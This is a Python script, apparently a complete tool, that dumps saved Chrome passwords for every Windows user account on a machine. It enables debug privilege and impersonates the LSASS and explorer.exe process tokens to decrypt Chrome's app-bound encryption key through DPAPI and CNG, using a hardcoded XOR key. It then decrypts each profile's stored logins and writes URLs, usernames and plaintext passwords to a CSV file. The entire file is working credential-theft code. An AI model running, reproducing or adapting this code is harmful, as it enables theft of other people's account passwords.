import os
import io
import json
import struct
import ctypes
import sqlite3
import shutil
import csv
import binascii
from contextlib import contextmanager

# pip install pycryptodome PythonForWindows
import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef
from Crypto.Cipher import AES

def isAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonateLsass():
    originalToken = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        # Find LSASS
        lsassProc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        impToken = lsassProc.token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impToken
        yield
    finally:
        windows.current_thread.token = originalToken

@contextmanager
def impersonateToken(procToken):
    """Directly impersonates a specific process token."""
    originalToken = windows.current_thread.token
    try:
        impToken = procToken.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impToken
        yield
    finally:
        windows.current_thread.token = originalToken

def parseKeyBlob(blobData: bytes) -> dict:
    buffer = io.BytesIO(blobData)
    parsed = {}
    headerLen = struct.unpack('<I', buffer.read(4))[0]
    parsed['header'] = buffer.read(headerLen)
    contentLen = struct.unpack('<I', buffer.read(4))[0]
    parsed['flag'] = buffer.read(1)[0]
    
    if parsed['flag'] in [1, 2]:
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    elif parsed['flag'] == 3:
        parsed['encrypted_aes_key'] = buffer.read(32)
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    return parsed

def decryptWithCng(inputData):
    ncrypt = ctypes.windll.NCRYPT
    hProv = gdef.NCRYPT_PROV_HANDLE()
    ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProv), "Microsoft Software Key Storage Provider", 0)
    hKey = gdef.NCRYPT_KEY_HANDLE()
    ncrypt.NCryptOpenKey(hProv, ctypes.byref(hKey), "Google Chromekey1", 0, 0)
    
    res = gdef.DWORD(0)
    inBuf = (ctypes.c_ubyte * len(inputData)).from_buffer_copy(inputData)
    ncrypt.NCryptDecrypt(hKey, inBuf, len(inBuf), None, None, 0, ctypes.byref(res), 0x40)
    
    outBuf = (ctypes.c_ubyte * res.value)()
    ncrypt.NCryptDecrypt(hKey, inBuf, len(inBuf), None, outBuf, res.value, ctypes.byref(res), 0x40)
    
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProv)
    return bytes(outBuf[:res.value])

def byteXor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def processUserChrome(userPath, writer):
    uName = os.path.basename(userPath)
    if uName.lower() in ["public", "all users", "default user", "administrator", "default"]: return

    statePath = os.path.join(userPath, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(statePath): return

    originalHome = os.environ.get('USERPROFILE')
    os.environ['USERPROFILE'] = userPath

    try:
        with open(statePath, "r", encoding="utf-8") as f:
            js = json.load(f)

        if "os_crypt" not in js or "app_bound_encrypted_key" not in js["os_crypt"]: return
        boundKey = binascii.a2b_base64(js["os_crypt"]["app_bound_encrypted_key"])[4:]
        
        # 1. Decrypt App-Bound Key (SYSTEM/LSASS)
        sysDec = None
        with impersonateLsass():
            try:
                sysDec = windows.crypto.dpapi.unprotect(boundKey)
            except Exception as e:
                print(f"[-] Failed App-Bound decrypt for {uName}: {e}")
                return

        # 2. Decrypt User Key (User Token)
        # FIX: Loop through ALL explorer.exe processes instead of name matching
        usrDec = None
        explorer_procs = [p for p in windows.system.processes if p.name.lower() == "explorer.exe"]
        
        if not explorer_procs:
            print(f"[-] No explorer.exe found. Is the user logged in?")
            return

        success = False
        for proc in explorer_procs:
            try:
                with impersonateToken(proc.token):
                    try:
                        usrDec = windows.crypto.dpapi.unprotect(sysDec)
                        success = True
                        # print(f"[+] Decrypted using explorer.exe PID: {proc.pid}")
                        break
                    except:
                        # Wrong user token, try next
                        continue
            except:
                continue
        
        if not success:
            print(f"[-] Failed to decrypt User Key for {uName}. Tried {len(explorer_procs)} explorer processes.")
            return

        pData = parseKeyBlob(usrDec)
        xorK = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        
        # 3. Decrypt AES Key (SYSTEM/LSASS)
        decAes = None
        with impersonateLsass():
            decAes = decryptWithCng(pData['encrypted_aes_key'])
        
        realK = byteXor(decAes, xorK)
        masterK = AES.new(realK, AES.MODE_GCM, nonce=pData['iv']).decrypt_and_verify(pData['ciphertext'], pData['tag'])

        baseDir = os.path.join(userPath, "AppData", "Local", "Google", "Chrome", "User Data")
        for prof in os.listdir(baseDir):
            dbP = os.path.join(baseDir, prof, "Login Data")
            if os.path.exists(dbP):
                tmp = f"temp_{uName}_{prof}.db"
                shutil.copyfile(dbP, tmp)
                
                try:
                    db = sqlite3.connect(tmp)
                    cursor = db.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for r in cursor:
                        url, user, encP = r[0], r[1], r[2]
                        if encP[:3] == b"v20":
                            try:
                                c = AES.new(masterK, AES.MODE_GCM, nonce=encP[3:15])
                                raw = c.decrypt_and_verify(encP[15:-16], encP[-16:])
                                pw = raw[32:].decode('utf-8', errors='ignore')
                                if not pw: pw = raw.decode('utf-8', errors='ignore')
                                writer.writerow([uName, prof, url, user, pw])
                            except:
                                pass 
                    db.close()
                except:
                    pass
                finally:
                    if os.path.exists(tmp): os.remove(tmp)
        print(f"[+] Successfully dumped {uName}")

    except Exception as e:
        print(f"[!] Error {uName}: {e}")
    finally:
        if originalHome: os.environ['USERPROFILE'] = originalHome

def main():
    if not isAdmin():
        print("Run as Admin!")
        return

    csvF = "decrypted_chrome_passwords.csv"
    uDir = "C:\\Users"

    with open(csvF, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["WindowsUser", "Profile", "URL", "Username", "Password"])
        for folder in os.listdir(uDir):
            p = os.path.join(uDir, folder)
            if os.path.isdir(p):
                processUserChrome(p, w)

    print(f"\nSaved to: {csvF}")

if __name__ == "__main__":
    main()
